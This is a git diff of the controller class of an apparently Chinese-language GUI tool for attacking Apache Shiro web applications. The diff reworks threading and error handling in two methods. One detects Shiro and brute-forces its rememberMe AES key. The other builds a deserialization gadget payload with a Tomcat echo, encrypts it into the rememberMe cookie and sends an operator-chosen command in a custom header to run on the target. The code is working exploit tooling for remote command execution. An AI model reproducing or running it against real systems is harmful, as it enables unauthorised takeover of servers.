@@ -23,6 +23,8 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.NotFoundException;
 import org.apache.commons.io.FileUtils;
+import org.apache.http.Header;
+import org.apache.http.HttpEntity;
 import org.apache.http.client.methods.CloseableHttpResponse;
 import org.apache.http.util.EntityUtils;
 
@@ -177,54 +179,71 @@ public class Controller {
 
     @FXML
     public void burstKey(ActionEvent actionEvent) {
-        this.validAllDataAndSetConfig();
-        burstKey.setDisable(true);
-        List<String> keys = this.getShiroKeys();
-        String url = paramsContext.get("url").toString();
-        String method = paramsContext.get("method").toString();
-        String rmeValue = paramsContext.get("rmeValue").toString();
-        Map<String,Object> params = (Map<String, Object>) paramsContext.get("params");
-        Map<String,Object> header = (Map<String, Object>) paramsContext.get("header");
-        if (header==null){
-            header = new HashMap<>();
-        }
-        if (params==null){
-            params = new HashMap<>();
-        }
 
-        logUtil.printInfoLog("开始检查目标是否用了shiro",false);
-        if (ShiroTool.shiroDetect(url,method,header,params,rmeValue)){
-            logUtil.printSucceedLog("发现shiro特征");
-            pool.submit(new BurstJob(url,method,params,keys));
-        }else {
-            logUtil.printAbortedLog("未发现shiro特征",false);
-            logUtil.printInfoLog("停止爆破",true);
+        Platform.runLater(() -> {
+            burstKey.setDisable(true);
+        });
+
+        try {
+            this.validAllDataAndSetConfig();
+            List<String> keys = this.getShiroKeys();
+            String url = paramsContext.get("url").toString();
+            String method = paramsContext.get("method").toString();
+            String rmeValue = paramsContext.get("rmeValue").toString();
+            Map<String,Object> params = (Map<String, Object>) paramsContext.get("params");
+            Map<String,Object> header = (Map<String, Object>) paramsContext.get("header");
+            if (header==null){
+                header = new HashMap<>();
+            }
+            if (params==null){
+                params = new HashMap<>();
+            }
+
+            logUtil.printInfoLog("开始检查目标是否用了shiro",false);
+            if (ShiroTool.shiroDetect(url,method,header,params,rmeValue)){
+                logUtil.printSucceedLog("发现shiro特征");
+                pool.submit(new BurstJob(url,method,params,keys));
+            }else {
+                logUtil.printAbortedLog("未发现shiro特征",false);
+                logUtil.printInfoLog("停止爆破",true);
+                //burstKey.setDisable(false);
+            }
+        }catch (Exception e){
+            e.printStackTrace();
+        }finally {
             burstKey.setDisable(false);
         }
+
 
     }
 
     @FXML
-    public void execCmd(ActionEvent actionEvent) {
-        this.validAllDataAndSetConfig();
-        String cmd1 = cmd.getText();
-        if(cmd1 == null || cmd1.trim().equals("")){
-            Tools.alert("命令错误","请输入一条命令如whoami");
-            return;
-        }
-        String key = aesKey.getText();
-        if(key == null || key.trim().equals("")){
-            Tools.alert("AES密钥错误","请输入密钥");
-            return;
-        }
-        execCmd.setDisable(true);
-
-        String expName =gadget.getValue().toString();
-        String url = paramsContext.get("url").toString();
-        String method = paramsContext.get("method").toString();
-        String rmeValue = paramsContext.get("rmeValue").toString();
-        Map<String,Object> params = (Map<String, Object>) paramsContext.get("params");
+    public void execCmd(ActionEvent actionEvent) throws IOException {
+        CloseableHttpResponse closeableHttpResponse = null;
         try {
+            Platform.runLater(() -> {
+                execCmd.setDisable(true);
+            });
+
+            this.validAllDataAndSetConfig();
+            String cmd1 = cmd.getText();
+            if(cmd1 == null || cmd1.trim().equals("")){
+                Tools.alert("命令错误","请输入一条命令如whoami");
+                return;
+            }
+            String key = aesKey.getText();
+            if(key == null || key.trim().equals("")){
+                Tools.alert("AES密钥错误","请输入密钥");
+                return;
+            }
+
+
+            String expName =gadget.getValue().toString();
+            String url = paramsContext.get("url").toString();
+            String method = paramsContext.get("method").toString();
+            String rmeValue = paramsContext.get("rmeValue").toString();
+            Map<String,Object> params = (Map<String, Object>) paramsContext.get("params");
+
             Class clazz = Class.forName(Constants.PAYLOAD_PACK+expName);
             Method mtd = clazz.getMethod("getPayload",byte[].class);
             byte[] payload = (byte[]) mtd.invoke(null, TomcatEcho.getPayload());
@@ -232,24 +251,28 @@ public class Controller {
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"),rmeValue);
             String encryptData = PayloadEncryptTool.AesGcmEncrypt(payload,key);
             String data;
-            if (isShowPayload.isSelected()){
-                //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
-                Controller.logUtil.printInfoLog(encryptData,true);
-            }
+
 
             //请求包header超过8k会报header too large错误
-            header.put("cookie",rememberMe+"="+encryptData);
-            header.put("exec",cmd1);
-            CloseableHttpResponse closeableHttpResponse;
-            if (method.equals(Constants.METHOD_GET)){
-                closeableHttpResponse = HttpClientUtil.httpGetRequest3(url, header);
-            }else {
-                closeableHttpResponse = HttpClientUtil.httpPostRequest2(url,header,params);
+            header.put("cookie",rmeValue+"="+encryptData);
+            header.put("s6",cmd1);
+            if (isShowPayload.isSelected()){
+                //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
+                Controller.logUtil.printData(header.toString());
             }
-            if (closeableHttpResponse!=null){
-                data = EntityUtils.toString(closeableHttpResponse.getEntity(),"utf-8");
-                logUtil.printSucceedLog(data);
-                logUtil.printSucceedLog(Arrays.toString(closeableHttpResponse.getAllHeaders()));
+
+            if (method.equals(Constants.METHOD_GET)){
+                data = HttpClientUtil.httpGetRequest(url, header);
+            }else {
+                data = HttpClientUtil.httpPostRequest(url,header,params);
+            }
+            if (data!=null){
+                if (data.contains("$$")){
+                    logUtil.printSucceedLog(data);
+                }else {
+                    logUtil.printWarningLog("未获取到回显!",true);
+                    logUtil.printData(data);
+                }
             }
 
         } catch (Exception e) {
@@ -280,7 +303,7 @@ public class Controller {
      * 校验必填,设置config数据
      */
     private void validAllDataAndSetConfig(){
-        logUtil.printInfoLog("开始校验参数",true);
+        //logUtil.printInfoLog("检测参数中。。。。。",true);
         String url = this.target.getText().trim();
         if (method.getValue().equals(Constants.METHOD_GET)){
             if (!Tools.checkTheURL(url)) {
